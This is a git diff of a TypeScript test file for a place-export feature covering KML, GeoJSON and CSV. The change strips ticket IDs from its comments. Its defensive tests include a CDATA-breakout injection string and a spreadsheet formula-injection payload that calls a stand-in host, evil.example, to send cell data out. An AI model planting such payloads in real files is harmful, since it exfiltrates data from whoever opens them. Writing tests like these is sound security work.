@@ -11,10 +11,9 @@ import {
 import { detectPlaceColumns } from "./csvImport/placeColumns";
 import type { TPlace } from "./placeUtils";
 
-// The seven grades are FIELD VALUES now, so the fixture speaks field keys —
-// and the export no longer has fixed grade columns at all: every field the
-// place carries leaves through the same `attr:<key>` mechanism, which is what
-// lets a campsite export `capacity` and no grades.
+// The seven grades are field values, so the fixture speaks field keys —
+// every field the place carries leaves through the same `attr:<key>` mechanism,
+// which is what lets a campsite export `capacity` and no grades.
 function place(overrides: Partial<TPlace> = {}): TPlace {
   return {
     id: "c1",
@@ -97,11 +96,11 @@ describe("buildPlaceExport — KML", () => {
     expect(blob.type).toBe("application/vnd.google-earth.kml+xml");
   });
 
-  // FECO-009: a `]]>` inside notes must not terminate the CDATA section early
+  // A `]]>` inside notes must not terminate the CDATA section early
   // — otherwise the rest of the description is parsed as XML markup, letting
   // a shared place's owner-authored notes inject elements into the file a
   // sharee exports and opens elsewhere.
-  it("escapes a ]]> inside notes instead of letting it close the CDATA section early (FECO-009)", async () => {
+  it("escapes a ]]> inside notes instead of letting it close the CDATA section early", async () => {
     const malicious = place({
       notes:
         "Approach via the north gully]]></description><Placemark><name>INJECTED",
@@ -128,7 +127,7 @@ describe("buildPlaceExport — KML", () => {
 });
 
 // A place record carrying every internal field the API can attach — these
-// must NEVER appear in an exported file (EXPORT-2).
+// must NEVER appear in an exported file.
 const INTERNAL_FIELD_OVERRIDES = {
   ownerId: "user-secret-owner-id",
   importBatchId: "batch-secret-id",
@@ -140,10 +139,9 @@ const INTERNAL_FIELD_OVERRIDES = {
   createdAt: "2026-05-01T00:00:00.000Z",
 } as Partial<TPlace>;
 
-// EXPORT-2: an explicit whitelist, so a future column on TPlace cannot start
-// leaking into files users hand to third parties. The seven grade keys left
-// this list when they became field values — they ride inside `fields`, which is
-// itself explicitly assigned rather than spread.
+// An explicit whitelist, so a future column on TPlace cannot start leaking
+// into files users hand to third parties. Grade keys ride inside `fields`,
+// which is itself explicitly assigned rather than spread.
 //
 // `foreignFields` is deliberately NOT here and must never be: it holds another
 // user's field labels and values, carried in on a copy.
@@ -166,7 +164,7 @@ describe("buildPlaceExport — GeoJSON", () => {
     });
   });
 
-  it("emits exactly the whitelisted properties — no internal fields (EXPORT-2)", async () => {
+  it("emits exactly the whitelisted properties — no internal fields", async () => {
     const { blob } = buildPlaceExport(
       [place(INTERNAL_FIELD_OVERRIDES)],
       "geojson",
@@ -238,7 +236,7 @@ describe("buildPlaceExport — internal fields leak nowhere", () => {
   );
 });
 
-describe("buildPlaceExport — CSV (EXPORT-1)", () => {
+describe("buildPlaceExport — CSV", () => {
   function csvFile(content: string): File {
     return new File([content], "export.csv", { type: "text/csv" });
   }
@@ -246,10 +244,9 @@ describe("buildPlaceExport — CSV (EXPORT-1)", () => {
   it("emits the import template's columns in order", async () => {
     const { blob, filename } = buildPlaceExport([place()], "csv");
     const { headers } = await parseCsv(csvFile(await text(blob)));
-    // The seven grade columns are GONE from the fixed set. They are field
-    // values, so they arrive as `attr:<key>` columns alongside every other
-    // field the place carries — which is what lets an export of campsites
-    // carry `capacity` instead of seven empty canyon columns.
+    // Grade columns are field values, arriving as `attr:<key>` columns
+    // alongside every other field the place carries — which is what lets an
+    // export of campsites carry `capacity` instead of seven empty canyon columns.
     expect(headers).toEqual([
       "name",
       "latitude",
@@ -280,7 +277,7 @@ describe("buildPlaceExport — CSV (EXPORT-1)", () => {
     const { blob } = buildPlaceExport([withFields, other], "csv");
     const { headers } = await parseCsv(csvFile(await text(blob)));
     // Union of keys across the set, sorted, each prefixed — after the fixed
-    // columns. The grade keys are in there too now, which is the collapse.
+    // columns, including grade keys.
     expect(headers.filter((h) => h.startsWith("attr:"))).toEqual([
       "attr:grade",
       "attr:hours",
@@ -298,7 +295,7 @@ describe("buildPlaceExport — CSV (EXPORT-1)", () => {
     expect(roles["sources"]).toBe("sources");
   });
 
-  it("round-trips through the app's own CSV parser, including gnarly notes", async () => {
+  it("round-trips through Logjam Web's own CSV parser, including gnarly notes", async () => {
     const gnarly = placeWith(
       {
         v_grade: 5,
@@ -418,11 +415,11 @@ describe("buildPlaceExport — CSV (EXPORT-1)", () => {
     expect(r2["attr:firstDescentYear"]).toBe("");
   });
 
-  // FECO-010: a cell beginning with =, +, -, @ opens as a live formula in
+  // A cell beginning with =, +, -, @ opens as a live formula in
   // Excel/LibreOffice/Sheets. A shared place's owner-authored name/notes/
   // custom-field value is attacker-reachable text that survives export
   // unmodified without this guard.
-  describe("formula-injection guard (FECO-010)", () => {
+  describe("formula-injection guard", () => {
     it("prefixes a name/notes cell starting with = with a neutralizing apostrophe", async () => {
       const malicious = place({
         name: '=WEBSERVICE("https://evil.example/?d="&A1)',
@@ -450,7 +447,7 @@ describe("buildPlaceExport — CSV (EXPORT-1)", () => {
       const { blob } = buildPlaceExport([southernWestern], "csv");
       const raw = await text(blob);
       // The neutralizing apostrophe must never reach the coordinate cells —
-      // it would corrupt the app's own round-trip via parseLatLng.
+      // it would corrupt Logjam Web's own round-trip via parseLatLng.
       expect(raw).not.toContain("'-33.5");
       expect(raw).not.toContain("'-70.2");
       const { rows } = await parseCsv(csvFile(raw));
